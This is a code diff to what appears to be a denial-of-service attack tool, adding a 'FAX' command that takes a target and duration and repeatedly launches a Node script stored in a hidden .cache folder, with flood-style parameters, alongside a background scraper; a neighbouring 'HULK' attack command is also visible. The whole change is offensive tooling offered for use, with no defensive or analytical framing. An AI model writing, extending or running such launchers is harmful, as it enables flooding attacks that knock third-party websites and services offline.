@@ -205,6 +205,29 @@ def mn_lp():
                 except Exception as e:
                     print(f"❌ An error occurred: {e}")
 
+            elif cmd == "FAX":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging FAX attack on {tg} for {mx_tm} seconds... 💥",
+                        0.05,
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(
+                            f"node bin/odd/.cache/FAX.js {tg} 600 100 10"
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f"node bin/odd/.cache/FAX.js {tg} 600 100 10"
+                        )
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: FAX <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
             elif cmd == "HULK":
                 try:
                     tg = parts[1]
